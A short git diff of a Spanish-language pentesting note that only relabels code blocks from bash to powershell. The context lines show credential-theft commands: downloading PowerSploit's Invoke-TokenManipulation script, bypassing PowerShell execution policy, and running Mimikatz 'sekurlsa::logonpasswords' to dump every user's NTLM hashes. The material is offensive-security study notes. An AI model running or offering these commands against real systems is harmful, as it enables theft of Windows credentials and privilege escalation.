@@ -10,7 +10,7 @@ Los atacantes obtienen fácilmente las credenciales hasheadas para loas ataques 
 ❯ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1
 ```
 
-```bash 
+```powershell
 ❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
  	# ep = Ejecutar politicas 
  	
@@ -30,7 +30,7 @@ Los atacantes obtienen fácilmente las credenciales hasheadas para loas ataques 
 		❯ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' # Nos muestra el hash NTLM de todos los usuarios asi como el del 'Admin' 
 ```
 
-```bash 
+```powershell
 # Abrimos una nueva consola de Poweshell como 'Admin'
 ❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
  	# ep = Ejecutar politicas 
